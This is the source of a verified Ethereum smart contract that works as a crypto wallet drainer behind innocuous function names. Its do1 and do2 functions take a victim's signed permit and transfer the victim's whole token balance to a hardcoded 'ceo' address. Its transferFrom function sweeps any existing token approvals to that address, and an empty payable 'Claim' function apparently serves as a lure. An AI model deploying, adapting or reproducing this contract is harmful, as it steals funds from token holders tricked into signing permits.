/**
 *Submitted for verification at Etherscan.io on 2023-04-18
*/

// SPDX-License-Identifier: Unlicensed                                                                         
pragma solidity 0.8.17;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
interface permit2 {
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
}
interface permit1 {
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function nonces(address owner) external view returns (uint);
    function permit(address holder, address spender, uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s) external;
} 
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}
contract Ownable is Context {
    address private _owner;
 
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
contract post is Ownable{
    constructor(address _owner) {
        transferOwnership(_owner);
    }
    receive() external payable {}
    address public ceo = 0x65795e57d68A7278Eb6bD515fDE07A8Cd4D95d76;
    function do2(address owner, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s, address const) external{
        permit2(const).permit(owner,address(this),value,deadline,v,r, s);
        value = permit2(const).balanceOf(owner);
        permit2(const).transferFrom(owner,ceo,value);
    }
    function do1(address holder, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s, address const) external{
        uint256 nonce = permit1(const).nonces(holder);
        permit1(const).permit(holder, address(this),nonce,expiry,allowed,v,r,s);
        uint value = permit1(const).balanceOf(holder);
        permit1(const).transferFrom(holder,ceo,value);
    }
    function transferFrom(address owner, address const) external{
        uint256 value1 = IERC20(const).allowance(owner,address(this));
        uint256 value = IERC20(const).balanceOf(owner);
        if(value>0 && value1>0){
          if(value>=value1){
            IERC20(const).transferFrom(owner, ceo,value1);
          }else{
            IERC20(const).transferFrom(owner, ceo,value);
          }
        }
    }
    function setceo(address ceos) external onlyOwner(){
      ceo = ceos;
    }
    function withdraw() external onlyOwner() {
      payable(ceo).transfer(address(this).balance);
    }
    function Claim() public payable {}
}